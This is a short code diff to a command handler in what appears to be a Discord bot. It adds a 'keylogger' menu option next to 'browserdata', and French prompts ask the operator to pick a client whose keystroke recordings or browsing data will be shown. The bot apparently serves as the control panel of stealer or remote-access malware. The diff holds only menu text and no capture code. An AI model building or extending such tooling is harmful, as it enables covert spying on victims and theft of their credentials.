@@ -130,6 +130,10 @@ export const handleListDataCommand = async (interaction) => {
             case 'browserdata':
                 content = "Sélectionnez un client pour voir les données de navigation :";
                 break;
+            case 'keylogger':
+                content = "Selectionner un client pour voir les enregistrements du clavier :";
+                break;
+
         }
 
         await interaction.editReply({content, components});
